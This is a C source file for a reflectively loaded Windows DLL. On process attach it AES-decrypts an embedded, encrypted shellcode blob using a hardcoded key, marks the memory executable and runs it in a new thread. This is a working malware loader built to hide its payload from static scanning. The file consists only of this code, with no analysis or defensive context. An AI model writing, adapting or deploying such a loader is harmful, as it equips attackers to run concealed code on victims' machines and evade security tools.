#include "ReflectiveLoader.h"
#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }

        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);

        return 0;
}

unsigned char payload[] = { 0x2f, 0x7f, 0x12, 0xf2, 0x47, 0xb8, 0x9a, 0x7c, 0x90, 0x92, 0xb4, 0xc, 0x38, 0xa2, 0x95, 0x77, 0xa, 0x0, 0x82, 0xcc, 0x92, 0xc4, 0x12, 0xdb, 0x51, 0xb4, 0xf0, 0xb1, 0x39, 0xdd, 0x3f, 0x7e, 0x7f, 0x67, 0xf3, 0x13, 0x49, 0x6f, 0xef, 0xc4, 0x3d, 0x4f, 0x5a, 0xc4, 0x32, 0x73, 0x3f, 0x65, 0xdb, 0x44, 0x87, 0x68, 0x56, 0x81, 0x3d, 0x90, 0xad, 0x58, 0x70, 0x21, 0xe1, 0x32, 0x1, 0x30, 0xd, 0x9c, 0x8, 0xeb, 0x45, 0xc6, 0xac, 0x36, 0xac, 0x44, 0x73, 0x31, 0x1e, 0xa, 0x74, 0xdb, 0xfc, 0xa3, 0xb6, 0xf3, 0xe7, 0x9f, 0x48, 0xc9, 0x5c, 0x73, 0xef, 0xba, 0xd1, 0xf3, 0x53, 0x68, 0x8c, 0x12, 0xbf, 0xb8, 0xee, 0x49, 0xf6, 0x5e, 0x21, 0x86, 0xba, 0x6e, 0x3f, 0x75, 0x19, 0x10, 0x9f, 0x3b, 0x3d, 0x9a, 0x1f, 0xb6, 0xaa, 0xe0, 0x25, 0xb6, 0x0, 0xf, 0x41, 0x80, 0xc1, 0x7a, 0x54, 0x60, 0x10, 0x3, 0xb5, 0xf7, 0x5c, 0x7a, 0x4a, 0x88, 0x35, 0x18, 0xd7, 0x39, 0x4b, 0x41, 0x19, 0x1c, 0x89, 0xba, 0x0, 0x70, 0x30, 0xc8, 0xe9, 0xeb, 0x47, 0x7d, 0x9, 0xd8, 0x4a, 0xf5, 0x55, 0xdc, 0x74, 0x80, 0x34, 0xb5, 0xb2, 0x69, 0x37, 0x26, 0x4f, 0xdc, 0x24, 0x51, 0xaf, 0x45, 0xe9, 0x1, 0x9c, 0xa4, 0x98, 0x3c, 0x2, 0x2e, 0xfa, 0x91, 0x6d, 0xf3, 0xf9, 0xba, 0x89, 0x44, 0xb1, 0x26, 0xfe, 0xee, 0x20, 0xfd, 0xe2, 0x4c, 0xac, 0xfd, 0xb7, 0xe2, 0xbe, 0xc5, 0xa3, 0xc7, 0x55, 0xff, 0xbe, 0xf1, 0xda, 0x44, 0x8d, 0xc5, 0x9e, 0x4d, 0xe8, 0x3e, 0x14, 0x1a, 0x23, 0x3, 0x11, 0xc3, 0xe8, 0xb5, 0x62, 0x6, 0x12, 0x15, 0x20, 0x84, 0x5a, 0x9e, 0x64, 0x8a, 0x25, 0x32, 0x40, 0x47, 0x86, 0x89, 0x52, 0xaf, 0x62, 0xc8, 0x88, 0x5e, 0x92, 0xf7, 0x67, 0xf4, 0xc9, 0xf3, 0x8c, 0x52, 0x7b, 0x53, 0xb2, 0xb2, 0x59, 0x57, 0xbf, 0x9e, 0xa0, 0x6e, 0xde, 0xce, 0xe5, 0x81, 0x2f, 0xec, 0x14, 0x69, 0xd7, 0xfb, 0xff, 0xd3, 0x5, 0xe0, 0xed, 0x51, 0xae, 0x60, 0x37, 0x4f, 0xc3, 0xe5, 0x91, 0xb0, 0x68, 0x2, 0xf2, 0x7d, 0x32, 0xf1, 0x58, 0xfc, 0xe1, 0xbe, 0x8e, 0x1f, 0x1d, 0xbf, 0xa9, 0x3d, 0x8b, 0xc0, 0x5d, 0x4, 0x30, 0x57, 0x39, 0x9e, 0xdb, 0x8c, 0xfb, 0x63, 0x4f, 0xc3, 0x14, 0x18, 0x9b, 0xa3, 0x7c, 0xa0, 0xf9, 0x2f, 0xa2, 0xf7, 0x41, 0x5a, 0x8c, 0xd3, 0x2b, 0xed, 0x32, 0x1b, 0xb1, 0x3c, 0x54, 0xa6, 0xc8, 0x2d, 0x86, 0xf7, 0x20, 0x4e, 0xf1, 0x2d, 0xc5, 0xa3, 0x1b, 0xb, 0x64, 0xc, 0xa7, 0xf0, 0xa9, 0xe, 0x19, 0xb8, 0xff, 0xf1, 0xc4, 0x48, 0x16, 0xf, 0x89, 0xd3, 0xdf, 0xe3, 0x46, 0xfd, 0x63, 0x32, 0x6e, 0xc1, 0x90, 0x87, 0xfa, 0x6, 0x43, 0xe2, 0x37, 0x1d, 0x9d, 0xd8, 0xf4, 0x1f, 0xa7, 0x9b, 0x58, 0xc4, 0xaf, 0x6f, 0xfa, 0xa3, 0x6, 0xa3, 0x84, 0x64, 0x83, 0x60, 0xeb, 0x60, 0x65, 0xac, 0xed, 0xdf, 0x27, 0x9b, 0x2e, 0xeb, 0x40, 0xf2, 0x9b, 0xe0, 0xd2, 0x8c, 0x27, 0xde, 0xfb, 0x73, 0xbb, 0xa9, 0x29, 0xfa, 0x5, 0xa8, 0x77, 0x8, 0x61, 0x57, 0x16, 0xe8, 0x69, 0x89, 0xdc, 0xb5, 0x9d, 0x12, 0xc3, 0x1b, 0x48, 0x7b, 0xa8, 0x20, 0x4c, 0xae, 0x97, 0x9, 0x60, 0xd5, 0x3a, 0xfd, 0x42, 0x2c, 0xf8, 0xf9, 0x76, 0x4b, 0x55, 0x5d, 0xd, 0xea, 0x90, 0x26, 0x31, 0x89, 0x0, 0x14, 0xf9, 0x83, 0x30, 0xfe, 0xaa, 0x67 };
unsigned char key[] = { 0x42, 0x32, 0x95, 0x89, 0x55, 0xff, 0x7c, 0xd, 0x32, 0x36, 0x72, 0x6, 0x26, 0xea, 0x1d, 0x9a };

void Run(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    unsigned int payload_len = sizeof(payload);

    // Allocate memory for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

    // Copy payload to allocated buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Make the buffer executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, launch the payload
    if ( rv != 0 ) {
                    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
                    WaitForSingleObject(th, -1);
    }

}

extern "C" HINSTANCE hAppInstance;
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
    switch( dwReason ) 
    { 
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hAppInstance;
            break;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Run, 0, 0, 0);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return bReturnValue;
}